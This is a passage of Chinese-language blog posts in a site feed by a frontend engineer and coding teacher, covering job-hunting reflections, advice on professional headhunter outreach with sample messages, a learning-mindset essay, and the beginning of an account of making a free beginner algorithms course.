的狀況。</p><p>在考慮的那幾天，我一直在想自己到底想要什麼，是錢嗎？頭銜？自由度？成長性？不是，這些都不是。</p><p>最後我想到了我在職涯發展上的一個缺憾，一個我一直想補起來的缺憾。因為過往都在小公司工作，人數不多，就算是大公司，團隊裡的前端也就我一個，第一份工作沒有專職前端，第二份工作一個，第三份工作三個，以上都是包含我在內的人數。</p><p>所以我的缺憾就是：「沒有跟我覺得很強的前端同事一起共事過」。以前的同事當然都不錯，但我並沒有那種「哇，這個人超強」的那種感覺，我想要找到這種環境，想要找到這種同事，想要體驗這種感覺。</p><p>所以我最後選擇了 B，繼續當個工程師，因為團隊比較大而且一直在積極徵才，我覺得很有可能可以填補我上面說的那個缺憾，跟很強的同事一起工作。</p><p>對我來說，這是目前我最在意的。</p><p>所以求職也是一個很好的思考的過程，邊求職邊面試，邊想說自己到底想要什麼，到底什麼是重要的什麼不是。這是個加速認識自己的過程。</p><h3 id="職涯目標"><a href="#職涯目標" class="headerlink" title="職涯目標"></a>職涯目標</h3><p>談完了那些我猶豫很久也不太確定的東西，來談點我確定的，那就是我的職涯目標。</p><p>我的職涯目標只有一個：成長。</p><p>可以是技術上的成長，可以是管理上的成長，只要能成長就好，目前沒有偏好特定面向。</p><p>然而在談目標的時候，有滿多公司喜歡談「個人目標」，就是撇除工作不談，你在個人的未來上想要獲得什麼，想要達成什麼事情。這邊我都直接回答我沒有長期規劃，沒有就是沒有，我不會去思考說我 40 歲想變什麼樣子，然後再反推回來。</p><p>我喜歡隨波逐流，且戰且走，對我來說這樣才比較有趣，所以我也不知道之後會變什麼樣子。若是談到個人興趣的話，會繼續做教學，之前那樣白天上班晚上弄教學，是我覺得滿適合我的生活方式。</p><p>這時候就有些公司會問說：「那來我們公司上班，要怎麼幫助你達成個人目標？」，我的回答是：「不用，而且拜託不要」，我的目標可以分為職涯上跟非職涯上的目標，前者是成長，後者是我喜歡做的事情，兩者是可以完全切開的，而且我也不想要公司管到後者去。</p><p>教學那些做興趣的事我自己可以管好，我從來沒有想過也不希望公司在這部份能幫到我什麼，我不需要。在工作上我追求的只有個人的成長，公司只要能滿足這個就好，其他非職涯上的目標公司不需要擔心。</p><p>上面講的事情之前沒有特別想過，所以一開始回答的時候可能沒那麼清楚，但隨著被問的次數變多，有把自己的想法整理得越來越好。就跟我前面所說的一樣，求職是個加速認識自己的過程。</p><p>這次得到的心得差不多就是這樣了，期待下次求職時會出現更多不同的感想。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>獵人頭觀察報告</title>
      <link href="/2020/04/23/about-head-hunter-27fe1c28648f/"/>
      <url>/2020/04/23/about-head-hunter-27fe1c28648f/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/about-head-hunter-27fe1c28648f/0__SdmhD0ADCFunMzPk.jpg"></p><p>這陣子正在找工作，目前已經塵埃落定決定好新東家了。這次求職主要使用的管道為 Linkedin，因此碰到了許多獵人頭，幾乎各大獵頭公司全部都聊過一輪。</p><p>而這次接觸了這麼多獵頭，想說可以來記一下心得，主要會想記以下兩點：</p><ol><li>比較雷的獵頭是如何？</li><li>比較專業的獵頭是如何？</li></ol><p>最後會綜合以上幾點，講一下我想像中比較好的獵頭大概會是什麼樣子。</p><h3 id="比較雷的獵頭"><a href="#比較雷的獵頭" class="headerlink" title="比較雷的獵頭"></a>比較雷的獵頭</h3><p>這次碰到過兩種，一種就是推薦錯職缺，完全搞不清楚我要找什麼。</p><p>我 profile 上面最新的工作經驗寫 Front-end engineer，簡介也明確寫說 Looking for a senior front-end engineer role，最新的 activity 也是講說我在找前端的工作，結果丟一個 PHP 工程師的職缺給我。</p><p>我以為都 2020 了不會有這種狀況發生。</p><p>第二種則是連話都說不清楚，有些就只傳了一句：「嗨」，傳這訊息到底要幹嘛？確認我是不是真人嗎？</p><p>這次碰到的基本上就這樣，其他的都還好。</p><h3 id="比較專業的獵頭"><a href="#比較專業的獵頭" class="headerlink" title="比較專業的獵頭"></a>比較專業的獵頭</h3><p>這一篇不知道大家有沒有看過：<a href="https://medium.com/@zonble/%E7%B5%A6%E9%82%A3%E4%BA%9B%E5%9C%A8-linkedin-%E4%B8%8A%E9%9D%A2%E4%B8%80%E8%A8%80%E4%B8%8D%E5%92%8C%E5%B0%B1%E8%A6%81%E4%BA%BA%E5%AE%B6%E6%89%8B%E6%A9%9F%E8%99%9F%E7%A2%BC%E7%9A%84%E5%8F%B0%E7%81%A3-head-hunter-a92019e42ab7">給那些在 Linkedin 上面一言不和就要人家手機號碼的台灣 Head Hunter</a>，真的很多直接就跟你要電話。</p><p>不是不能透過電話，畢竟有些事情用電話聊比較方便，但是在聊之前必須讓我覺得你是個比較專業的獵頭，讓我覺得你有機會幫到我，我才會願意跟你聊。</p><p>這其實沒有很難，只要把我的 profile 看過一遍，大概知道我的經歷，然後有看過我的發文，知道我最近在找工作，知道裡面寫的期望待遇，我覺得就差不多了。</p><p>然後，在給電話之前，我會先跟對方要更詳細的職缺說明，如果我光看 JD 就覺得沒興趣，那你要跟我聊什麼？如果不給電話就不給 JD 的，這種也是謝謝再聯絡。</p><p>目前我碰過的最專業的獵頭，認識的契機也滿特別的，是極少數不是用罐頭訊息當開場白的，而且一開頭就說：「我是獵頭，但我沒有想要找你談工作，我只是看到你 blog 覺得很有趣，所以想要加你 Linkedin。但如果你或是朋友有想換工作的需求，當然也可以聊聊」</p><p>直接海放一堆罐頭訊息，雖然說就算是來聊工作的我也會 connect，畢竟 Linkedin 就是一個沒有很怪基本上都會 connect 的平台，但通常按完確認就忘記這個人了。而這個獵頭是因為看到 blog 而加的，所以印象特別深刻。</p><p>之前有朋友找工作的時候有推薦給她，這一次終於輪到我找工作了，當然也是第一個直接找她，因為很久以前已經有碰面稍微聊過了，所以這次就直接用電話聊。</p><p>她在電話聊的時候，會先確認我理想中的工作型態，而且會注意到很多細節，並且根據她的專業給我建議。例如說第一個談的可能是薪水，我會問她覺得我開的這個範圍怎麼樣，她會根據她以前看過的案例搭配對我的理解，說說她的想法，給我一個建議的範圍，也讓我對薪資市場比較有概念。</p><p>再來的話就是確認我的工作偏好，例如說產業，有沒有對哪些特別有興趣，或是特別沒興趣，還有工作地點，像是很多人都跟她說南港可以，面試完才說好遠，就算拿了 offer 也不會去，所以要特別確認一下。</p><p>還有公司型態，喜歡大公司還小公司？博弈業可不可以？要找的職位是工程師，那如果要帶人可以嗎？要講英文的可以嗎？寫 Vue 可以嗎？Angular 可以嗎？從各個面向去瞭解，再從手邊的職缺去找說有沒有適合我的。</p><p>如果整個過程都讓我覺得很專業，就算手邊沒有適合的職缺我也覺得沒關係。因為跟對方聊的過程中，其實也是幫我自己限縮範圍，並且整理自己喜歡的公司型態。</p><p>再來，如果手邊有適合的職缺，就直接跟我說公司名稱、公司做什麼的以及工作內容還有面試流程，若是以前有送人去面試過，也會講之前面試者的心得，面試大概會考哪些東西之類的。</p><p>這一點會讓我覺得獵人頭就像是 HR，一間代表所有客戶的 HR，而且可能是：「站在你這邊的 HR」，會希望你薪水拿高一點。所以對面試流程要很清楚，對公司的優缺點也要很清楚。獵頭當然可以靠話術把你騙去某一間公司，但我覺得這是短視近利的行為，因為只能騙一次，而且騙去之後信任就瓦解了，就永遠失去這個客戶。若是那個人像我一樣這麼愛寫心得，失去的可能就不只一個了。</p><p>所以像是這個專業的獵頭會特別跟我說某間公司有開缺，但是因為巴拉巴拉的緣故所以風評不太好，可以自己斟酌一下看要不要投。所以整體聊下來的感覺都滿不錯的，在電話中確認完需求以後就直接跟我介紹手邊的公司，然後一間一間跟我確認這個要不要丟，也聽了一些公司的小八卦。</p><p>雖然最後並沒有透過獵人頭成功找到工作，但我覺得倒不是這麼重要，畢竟可能他們手上就是比較少缺，或是有的缺剛好我都不喜歡。但徵才本來就是長期關係的培養，未來都還有機會再合作。</p><h3 id="如果我是獵頭"><a href="#如果我是獵頭" class="headerlink" title="如果我是獵頭"></a>如果我是獵頭</h3><p>身為求職者，看了不少獵頭以後當然有滿多心得的，而我也會從一個求職者的角度去想一個問題：</p><blockquote><p>如果哪一天我想當獵頭，我會怎麼做？</p></blockquote><p>首先，我認為獵頭應該要是長期關係的培養，所以會希望能捨棄亂槍打鳥的行為，透過不同的客製化訊息來表達誠意。雖然很花時間，但我認為是有價值的。</p><p>針對正在積極求職中以及比較消極被動（在職而且沒有對外透露想找工作）的人選，也會傳送不同的訊息。</p><p>對於消極被動的人選來說，一開始傳訊息就想要跟他電話聊聊是不切實際的事，因為他根本沒有足夠的動機跟你聊。我認為比較好的做法是直接把手上有的職缺丟給他，問他有沒有興趣，有興趣的話可以進一步聯絡，沒有興趣的話未來還有機會再合作。</p><p>我可能會傳的訊息如下：</p><blockquote><p><em>XXX 您好，我是 OOO 公司的 Huli，主要負責網站前後端工程師這一塊的人才招募，因為看見你常常發表一些技術文章，例如說 AAA 或是 BBB 相關的技術，希望可以跟你 connect 一下。</em></p></blockquote><blockquote><p><em>從你的 Profile 看起來，目前似乎沒有打算找工作，我這邊有一個缺是做 XX 領域相關的，正在招募資深前端工程師，薪水範圍大概是年薪 100 萬～150 萬，如果有興趣的話我們可以進一步詳談，可以用訊息、信件或是電話，都是沒有問題的。</em></p></blockquote><blockquote><p><em>若是你目前沒有找工作的打算也沒關係，如果哪天想開始看工作，或是想知道目前市場上最新的一些動態，就算是一兩年後，都可以再跟我說，我們可以再找機會好好聊聊。希望未來能有合作的機會，感謝！</em></p></blockquote><p>先講一下為什麼訊息會這樣寫，首先呢，雖然這個人選沒有在找工作，但以我自己來說，如果看到我覺得不錯的職缺，還是有可能會想面試看看。可是如果要先跟獵人頭通電話，我就不想了，因為這很麻煩。</p><p>所以我覺得比較好的辦法是先把足夠的資訊跟對方說，有興趣的話可以再詳談，而且不一定要電話，用文字訊息也可以，增加人選與你溝通的動力。若是對方真的沒有想工作，也可以試著讓對方對你比較有印象，下次想要求職時可能就會先想到你。</p><p>以上是針對沒有主動求職的人的訊息，若是針對已經有在積極主動求職的人，訊息就不一樣了，大概會是：</p><blockquote><p><em>XXX 您好，我是 OOO 公司的 Huli，主要負責網站前後端工程師這一塊的人才招募，最近留意到你正在求職，不知道有沒有這個機會能跟你討論一下我手上的職缺？</em></p></blockquote><blockquote><p><em>從你的過往經歷看起來，應該是在找資深後端工程師的位置，我手上有一些像是金融、電商還有旅遊業相關的職缺，如果有興趣的話我們可以進一步詳談，我會先聽聽看你這次想要找哪種類型的公司以及期望待遇，再看看我手上有沒有適合的可以推薦給你。</em></p></blockquote><blockquote><p><em>之後可以用訊息、信件或是電話聯絡，都是沒有問題的。或是我也可以大概跟你說明一下我這邊知道的最新的市場資訊，例如說開缺的狀況啦，或者是年資大概對應的薪水範圍等等，我都很樂意與你分享！</em></p></blockquote><blockquote><p><em>如果有興趣的話都可以再跟我說，我們可以再找機會好好聊聊。希望未來能有合作的機會，感謝！</em></p></blockquote><p>若是對方已經很明顯是在求職了，那重點就是：</p><ol><li>告訴對方你手上有缺，而且可能適合他</li><li>告訴對方除此之外，也可以分享市場狀況</li></ol><p>第二點滿重要的，因為那個職缺我可能不會心動，但對於市場狀況就會。因為獵人頭通常會比求職者還理解整個市場的狀況，對求職者來說多知道一些資訊當然是好的，所以並不會排斥這樣的機會（至少我不會啦）。</p><p>就算聊完以後手邊暫時沒有適合的缺，也可以跟對方說：「不好意思，目前手邊沒有適合你的工作機會，但我會隨時幫你留意，如果有新的訊息出來再通知你！」</p><p>以上是如何去接觸求職者或是潛在客戶，取得接觸以後無論是用文字還是電話，都可以照我前面在談碰到專業獵頭的經歷那樣，先去確認需求，確認完以後再根據理解推薦適合的職缺，然後像是公司 HR 那樣介紹公司、工作內容、面試流程以及薪資範圍等等，有哪些優缺點或是八卦也可以一併附上。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>以上就是這一次跟獵頭接觸的一些心得總結。有時候可能會有：「我來當獵頭應該也不錯」的想法，但我覺得可能是我太天真了，畢竟人百百種，搞不好獵頭留的電話其實有一堆人會主動打過去之類的，或者是搞不好罐頭訊息成效很好，根本就不需要客製化。</p><p>不過我認為愈厲害的人，對獵頭的專業程度要求一定也愈高。道理很簡單，因為他們收到太多獵頭的訊息了，如果你沒辦法在訊息裡面跟別人做出區隔，讓他覺得你很專業，他怎麼會對你有印象？</p><p>總之呢，在求職者眼中，專業跟不專業的區別還是很明顯啦。</p><p>最後，如果你覺得文中講的獵頭還不夠專業，你有碰過更專業的，很歡迎在底下留言讓我知道。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打造「正確」學習 mindset</title>
      <link href="/2020/04/19/mindset-36c163303217/"/>
      <url>/2020/04/19/mindset-36c163303217/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/mindset-36c163303217/0__eX1MS8rnDqL__W1Nv.jpg"></p><p><a href="/2019/12/15/mentor-program-3rd-result-df178bb55f4/">程式導師實驗計畫</a>是一個為期半年的線上程式教學活動，目標是在結業時培養出基礎紮實的工程師。第三期於去年年底結束，目前正在籌劃第四期（五月會開始招生），所以我最近正在調整第四期的課綱。</p><p>以前就有學生問過我，在我看過的案例裡面，怎樣的背景比較容易轉職成功？看了三期之後，我的回答是：「正確的 mindset」，mindset 可以翻作是心態或者是思考方式，其實是一種比較難改變的東西，因為你的思考模式可能已經固定了。</p><p>所以呢，在第四期的開頭我想特地加一個段落來談談 mindset 這件事情。其實相關的主題以前我就寫過一篇了：<a href="/2019/04/13/before-learning-b9b933b6078e/">學程式的第零課：心態調整</a>，那篇談的是學程式前可能會有的心態障礙，但這篇談的範圍會更廣一點。</p><p>在正式進入主題以前，先來談談這個標題吧！我把「正確」兩個字特地框起來，因為有時候很難說有什麼是真的「正確」的，純粹是個人喜好不同而已。例如說我認為正確的心態是「無論你想做什麼都行，就算不想做事也行」，但很多人的心態可能是「我一定要持續進步」之類的，這時候其實就很難說哪個是正確的，因為這本來就不是一件有標準答案的事。</p><p>因此這邊的「正確」，完整的解釋是：「我個人覺得比較好的」，但標題如果取叫：「打造我個人覺得比較好的 mindset」有點太冗長，所以只好借用了正確這兩個字。</p><p>所以接下來就是來談談幾種不同的心態，然後說一下為什麼我覺得比較好。會談到的主題如下：</p><ol><li>學習的心態</li><li>看待成功與失敗的心態</li><li>比較的心態</li></ol><h3 id="學習的心態"><a href="#學習的心態" class="headerlink" title="學習的心態"></a>學習的心態</h3><p>學習的大忌莫過於「光說不做」還有「不去思考」，或許還要再加上一個「畫地自限」。</p><p>光說不做這個就不多談了，很有可能是你沒有動力，那可以參考我之前寫過的：<a href="/2018/10/29/learn-coding-9c572c2fb2/">致跟我一樣的拖延症患者：動力是需要刻意創造的</a>。</p><p>畫地自限這件事情在一開始貼的那篇學程式前的心態調整有提過了，儘管很多人完全沒有寫過程式，但因為各式各樣的原因（例如說數學不好之類的），都會認為自己很有可能學不好。</p><p>不是啊，你連學都沒學過怎麼知道學不好，怎麼不學一下再試試看。如果你有學過然後發現學不好，這也沒關係，可能是老師教得差或是真的很沒有天份，至少有去試過了。可是沒有試過就直接投降輸一半，這樣我是覺得有點可惜。</p><p>比起畫地自限，我更推崇的心態是「到處試試看」，就像某飲料的 slogan：try it 還有某運動品牌的 just do it，都是同樣的意思。先去試試看，而且試試看的目的並不是為了「成功」，而是「試試看」這件事情本身。換句話說，有去嘗試是最重要的，至於嘗試過後是成功還是失敗，其實並沒有那麼重要，至少你試過了。</p><p>一旦你試過以後，若是發現真的不適合，那不要勉強也沒關係。舉例來說，我打從第一次吃到薑就發現我超爆幹討厭薑味，從此以後視薑為天敵，別人在那邊瞎說什麼「不會啦，哪有什麼味道」我都不信。我試過了，我不喜歡，我有理由不想再試一次。</p><p>舉一個相反的例子，那就是苦瓜，以前覺得苦瓜很苦所以不敢吃，直到某次跟同事出去吃飯，點了一盤鹹蛋苦瓜，一吃下去天為驚人，為什麼鹹蛋配苦瓜可以那麼好吃！從此之後就對苦瓜改觀，發現沒有想像中難吃。因為我去試了，所以才能發現這件事。</p><p>「試試看」是很多問題的最佳解，因為無論你的想像如何，無論你在腦中演練過多少遍，都不如實際去試一遍來得有用。</p><h3 id="看待成功與失敗的心態"><a href="#看待成功與失敗的心態" class="headerlink" title="看待成功與失敗的心態"></a>看待成功與失敗的心態</h3><p>什麼是成功，什麼又是失敗？</p><p>程式導師計畫的學生人數一期比一期多，可是第三期的心得文數量卻比第二期少了許多，為什麼會這樣？因為第三期「轉職失敗」的心得文一篇都沒有。</p><p>或許是因為大家都害怕「失敗」這個詞，害怕被貼上失敗的標籤。也或許是出於比較的心態，想說其他同學都找到工作了，怎麼自己還在做作業，唉，這樣怎麼有臉 po 課程心得。</p><p>大家知道我覺得在考試中最強的是哪一種人嗎？</p><p>不是考 100 分的人，而是拿了低分還很開心的人。</p><p>為什麼？因為他不在意。</p><p>他根本不在乎成績，不在乎自己的分數是多少，因為這跟他「個人」一點關係都沒有。英文考很低又怎麼樣？就只代表「這張考卷上的題目你不會」，那就代表英文很爛嗎？不見得，搞不好閱讀真的很爛，但是口語很強。那就代表不聰明嗎？不見得，搞不好其他領域很強。</p><p>高三那年我拿到了前兩年的成績單，發現校排的 PR 是 5（5 已經是最低了），代表我是全校倒數的那一群人。我很難過嗎？沒有，我超開心，跟同學炫耀著：「欸欸你看，校排倒數欸，超猛」。</p><p>大二上的時候我拿到了我的成績單：</p><p><img src="/img/mindset-36c163303217/1__lXXEdiJu3slKc8Zyh5ey__A.jpeg"></p><p>而我的心得是：「好可惜，為什麼沒有拿到 C，不然我就拿到一條龍（從 A+~C 九個等第都有）了」。</p><p>我從來都不覺得這些成績有什麼，在我休學的時候那些「唸台大幹嘛休學」或是「沒有大學學歷很慘喔」的聲音也從來沒有被我放在心上，因為我知道這些都不代表什麼，這些一點都不重要。</p><p>那重要的是什麼？</p><p>重要的是實力，重要的是我知道自己在做什麼。</p><p>如果我跟外國人一起工作或是聊天都沒有問題，我會在意自己多益只有 500 分嗎？不會。</p><p>如果我喜歡烘焙，然後做出來的蛋糕跟麵包超好吃，以後就是想走這一行，我會在意自己在學校的時候物理化學被當嗎？不會。</p><p>為什麼要讓別人幫你定義成功或失敗？這一點都不合理。你管他什麼成功跟失敗，知道自己在幹嘛就好了。</p><p>課程中的「轉職失敗」就只是代表「在期限內沒有找到工作」，這代表著你能力不足嗎？不一定，可能是其他人能力太好，或是你因為有些事情耽擱到了時間。如果你把計畫中的「轉職失敗」當作是「我一輩子都沒辦法變成工程師」或者是「我的人生好失敗」，那可能才是真的失敗。</p><p>這就像是，你在猜拳的時候會覺得猜輸了就整個人都很失敗嗎？不會，因為你知道這只是很不重要的一部分。課程也是這樣的，期限內沒找到工作就沒有找到，根據課程定義來說的確是轉職失敗，但跟你個人的成功或者是失敗一點關係都沒有。</p><p>我在<a href="/2020/02/02/i-failed-9386c6b0a681/">提早出關，大家安安</a>這篇裡面也很大方地承認我就是閉關失敗了，而且我覺得這一點都沒有什麼。</p><p>所以，我們到底要如何面對失敗跟挫折？</p><p>第一步，你的失敗不是你的失敗。雖然的確失敗了，但這一點都沒有什麼，不代表你的人生就完蛋了或是需要為此感到丟臉。</p><p>第二步，冷靜面對，找出原因。如果你想做改善的話，就找出為什麼。</p><p>第三步，解決它，去解決你找出的那個原因。</p><p>以前面提到的程式導師實驗計畫為例，期限內沒找到工作就坦承自己在計畫的定義中的確是失敗了，但是這一點都沒有什麼，完全不代表你比別人差，或者是以後都找不到工作了。</p><p>比起這個，更重要的是去找出原因，看看自己為什麼期限內沒辦法達成這件事，然後去改善、去優化，去把問題解決掉，讓自己變得更好。</p><p>你不需要把失敗看作是一個終點，它不是，它只是路上的風景之一而已。你要去習慣它，然後試著觀察它，就會發現它其實也是很美好的。</p><h3 id="比較的心態"><a href="#比較的心態" class="headerlink" title="比較的心態"></a>比較的心態</h3><p>雖然是老梗了，但請容我再說一次：人比人，氣死人，蛋糕比蛋糕，氣死蛋糕。</p><p>前面<a href="/2019/04/13/before-learning-b9b933b6078e/">學程式的第零課：心態調整</a>其實就有談過比較的心態這件事，結論是要大家好好看著自己就好，雖然這真的很不容易就是了。</p><p>其實前面所講的成功或失敗的定義跟比較也有關係，不想承認失敗是因為覺得這樣就會輸給其他人，其他人成功但你卻失敗了，有種低人一等的感覺。解法前面講過了，就是不要把失敗看在眼裡，不要覺得這是一件有分高下的事情。</p><p>總歸來講，就是要從內部去肯定自己，而不是從外部去尋求他人的肯定。當你能做到這件事情的時候，就沒有什麼可以傷的了你了。不過這點我覺得比其他的都還要難達成，真的是知易行難，因為我自己都做不太到。</p><p>關於比較，還有一點要特別提的。那就是這一路上你會看到很多人分享的心得，無論是從我這邊出來的還是從其他地方出來的，有關於轉職成工程師這件事情，有一大堆的心得可以參考。</p><p>這參考之前請務必注意一件事情：「每個人都是獨一無二的」，所以參考僅供參考，沒有什麼「為什麼他可以我不行」或是「為什麼我可以他不行」這種事。在參考他人的經驗的時候，千萬別忘記背後有很多你看不見，對方也不會提（或根本沒想到要提）的東西。</p><p>例如說我一直說自己英文差英文差，我是真的這樣認為，但從某些人的角度看起來，可能我的英文已經算好了。因為我的比較基準是那些早就在國外唸書的同事，所以會覺得自己英文差。</p><p>所以這本來就是個不客觀的事。</p><p>你會看到一大堆各種背景轉職成工程師的文章，但這不代表什麼，把它當作故事看看就好。看這種文章的時候，需要認真看的是他的學習方法跟心態，看有沒有什麼值得參考的地方，而不是一直拿別人的背景跟自己做比較。</p><p>老話一句，他可以不代表你可以，他不可以也不代表你不可以。那你到底可不可以？回歸到一開始講的：試試看就知道了。</p><p>心態改變之所以難，就是因為無論我講再多，無論你看再多，很可能都沒有用。不過我覺得這其實也沒什麼關係，之所以沒有用，有可能是因為你已經有了自己覺得很不錯的心態或是生活模式，那其實沒有什麼需要改變的。</p><p>我寫這篇其實也是分享我覺得比較好的心態，但什麼是「好」就是因人而異，大概就跟我之前寫過的：<a href="/2020/02/10/learning-c6656ef14cd4/">用對你有效的學習方法，無論那是什麼</a>一樣，如果你已經找到對自己有用而且覺得很不錯的心態，那可以忽略我所說的一切。</p><p>找到自己才是最重要的。如果你還沒找到的話，可以試試看我上面提的那一些心態。</p><p>希望在參與計劃學程式的同時，大家也能邊學邊思考自己比較喜歡怎樣的心態以及生活模式，確立自己的價值觀。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《先別急著寫 leetcode》線上課程製作全記錄</title>
      <link href="/2020/03/23/leetcode-alg101-4848b595cef4/"/>
      <url>/2020/03/23/leetcode-alg101-4848b595cef4/</url>
      
        <content type="html"><![CDATA[<p>先別急著寫 leetcode 是我最近才推出的免費線上課程，總長度約 10 個小時，課程目的是希望讓初學者透過一系列的練習培養程式基礎能力、熟悉程式語法以及加強程式思維。如果你對這門課程感到好奇，課程連結在這邊：<a href="https://lidemy.com/p/alg101-leetcode">https://lidemy.com/p/alg101-leetcode</a>，可以先點進去看看。</p><p>而這篇就是想來記錄一下做這門課程的理由以及製作過程，還有做完課程之後的一些想法跟檢討。</p><h3 id="課程的起源"><a href="#課程的起源" class="headerlink" title="課程的起源"></a>課程的起源</h3><p>我已經忘記從什麼時候開始有了要做這門課的想法，但我猜應該是去年九月十月，看著學生出去面試的時候才有的心得。換句話說，這門課原本完全不在我的計劃之內，我沒有想過要做這類型的課程。</p><p>那到底學生出去面試以後發生了什麼事，會讓我想做這門課呢？</p><p>身為一個不斷強調基礎的人，在我的課程裡面前幾週是學習 JavaScript 並且熟悉程式語法，有一些作業讓他們實作內建函式，也提供了一些基本的題目讓他們練習。不過以時間上來看，大概兩三週就結束了，之後就再也沒有這種程式解題類型的題目出現。</p><p>因為我一開始認為這種程式邏輯的東西，可以透過寫應用程式來培養。你在寫 todo list 或留言版這種實際功能的時候，就能鍛鍊到這一塊，就能對寫程式愈來愈熟悉，也更有程式相關的思維邏輯，思考方式也會跟著改變。</p><p>但是當課程結束，有些學生出去面試的時候，讓我對上述的觀念產生質疑。這些學生是有能力的，他們可以獨立寫出一些簡單的應用程式，這是完全沒有問題的，可是對於一些我認為再簡單不過的題目，卻卡關卡很久。</p><p>例如說判斷質數、印出九九乘法表或其他大概是 ACM 一星題左右程度的那些題目。這點是出乎我意料的，我沒有預期到這種狀況。我原本認為既然學程式這麼久，這些東西應該就要像吃飯喝水般容易（就是俗稱的水題）。更何況這些題目是我國中剛學程式沒多久以後就覺得很簡單的題目，所以一開始不太能理解為什麼解不出來。</p><p>但後來仔細想想，其實剛開始學程式的時候我也是有經過訓練的，特別去訓練這些題目。而且自己說雖然不太準，但從其他人的角度看起來，我的確是有這方面的天份，在早期學程式的時候都過得滿順利的。</p><p>總之呢，在這段過程中我清楚地意識到了一件事：「對有些初學者來說，這些程式基礎是需要經過訓練的」，如果沒有這種訓練，這方面的能力進步的可能會滿慢的。</p><p>再加上近幾年刷題風潮盛行，有許多初學者基礎都還沒打好，就傻傻地跟別人去學怎麼刷題，我覺得這樣效益不大。為什麼不大？因為基礎還沒打好就去刷題，大概就跟你國中的時候去寫大學的數學題一樣，你碰到了題目發現不會，就針對這題去學解法；學完以後碰到下一題還是不會，就只能針對那題再去學一次解法。一旦碰過沒看過的題目，就完全解不出來了，因為你學的是解法，而不是解題。</p><p>可是如果有乖乖把基礎打好，國中的時候解國中的題目，高中的時候解高中的，到了大學，儘管有些題目沒有看過，但依然能夠憑著以前的基礎解出來。有了基礎之後更往上走才會走得踏實，成效也會比較好一點。</p><p>所以這堂課就是秉持著這樣的概念產生的，課名也是這樣取出來的。希望初學者們不要急著去寫 leetcode，而是先把基礎打好，才去看看怎樣的學習方法比較適合自己。話說當初在課名選擇上面，還有想了另一個比較嗆的名稱：「你連這些水題都不會，學別人刷什麼題」，後來覺得這當作課名有點太長，當作副標題好像比較適合。</p><h3 id="課程大綱規劃"><a href="#課程大綱規劃" class="headerlink" title="課程大綱規劃"></a>課程大綱規劃</h3><p>通常有了課程的粗略想法以後，我會開始規劃大綱。只要大綱能順利完成，就只剩下錄製的部分了。</p><p>在大綱的規劃上面，我使用的工具是 Evernote：</p><p><img src="/img/leetcode-alg101-4848b595cef4/1__hO0qv1nGnE4zczoc4VQCow.png"></p><p>會使用 Evernote 是因為手機跟電腦上都可以很方便地存取，而且資料是同步的。所以出門在外的時候有靈感就可以直接記起來，方便很多。而在筆記的使用上我也沒有用什麼特殊的功能，大多數時候都是純文字而已，就真的只是為了記錄一些想法。</p><p>大綱內容大概會像底下這樣子，把標題跟內容都先想好：</p><blockquote><p><em>## Unit2：寫程式之前，先學會「看程式」</em></p></blockquote><blockquote><p><em>「看程式碼」指的不是掃過去而已，而是你在看的時候，就會知道程式碼是怎麼執行的了。所以這一個單元要讓大家知道程式碼執行流程</em></p></blockquote><blockquote><p><em>## Unit2.1：你其實看不懂程式碼</em></p></blockquote><blockquote><p><em>給兩個範例，練習一行一行跑：</em></p></blockquote><blockquote><p><em>1. 陣列總和<br>2. 找最大值</em></p></blockquote><blockquote><p><em>## Unit2.2：人體編譯器<br>給練習然後一行一行跑<br>這時候給真的程式碼<br>範例同上</em></p></blockquote><blockquote><p><em>## Unit2.3：Debug 神器：Debugger<br>chrome devtool debugger 的使用<br>別的程式語言也有 debugger<br>範例同上</em></p></blockquote><blockquote><p><em>## Unit2.4：Log 雖可恥但有用<br>## Unit2.5：實戰練習：找次大值<br>## Unit2.6：實戰練習：字串轉大寫<br>## Unit2.7：實戰練習：刪除特定字元<br>## Project2：人體編譯器</em></p></blockquote><blockquote><p><em>出三個作業，給程式碼讓他們一行行寫下執行流程<br>記得附上參考解答</em></p></blockquote><blockquote><p><em>1. 找次小值<br>2. 大小寫互換<br>3. 印出因數</em></p></blockquote><p>只要先把大單元的標題（ _Unit2：寫程式之前，先學會「看程式」_）想出來，底下的內容就比較好規劃。而底下小單元規劃好之後，就可以來想單元的範例應該要是什麼，想完範例之後這整個單元就規劃完成了。</p><p>在完成課程大綱的雛形，把每一個單元以及小單元的內容都大致想過之後，我就把課程大綱搬到 <a href="https://github.com/Lidemy/ALG101-too-weak-to-leetcode">GitHub</a> 上面了：</p><p><img src="/img/leetcode-alg101-4848b595cef4/1__RC0Pq0slWstg3kihzgKaWw.png"></p><p>搬到上面去有兩個理由：</p><ol><li>想把 GitHub 當作課程的資源彙整處，大綱、範例程式碼跟簡報都在這邊</li><li>想嘗試用 Git 版本控制來記錄課程的每一個改變，把課程當作一個專案</li></ol><p>這個階段結束之後，課程大綱就完成了。也就是說，大概已經知道每一個單元要教什麼，心裡已經有個藍圖。接下來就可以開始錄課程影片了嗎？不不不，在錄製之前，還需要做一些前置作業的準備。</p><h3 id="課程錄製前置作業"><a href="#課程錄製前置作業" class="headerlink" title="課程錄製前置作業"></a>課程錄製前置作業</h3><p>由於先別急著寫 leetcode 是一門需要大量練習的課程，因此若是能提供作業讓學生練習，那再好不過了。不過，既然有作業，那會有人改嗎？如果沒人改的話，那會不會就降低寫的動力？可是如果有人改，那誰要來改？</p><p>幸運的是，這一堂課所教的重點是程式解題，而在程式解題的領域中，有一個東西叫做 Online Judge System，一個線上的批改系統，只要送出你的程式碼，就可以讓電腦來幫忙判斷有沒有寫對。</p><p>為了這堂課程，必須要先準備這個系統才行。所以在思考大綱的同時，其實我也一邊做著這個準備，找尋現有的工具來架設一個線上批改系統。</p><p>這是最後完成的樣子：</p><p><img 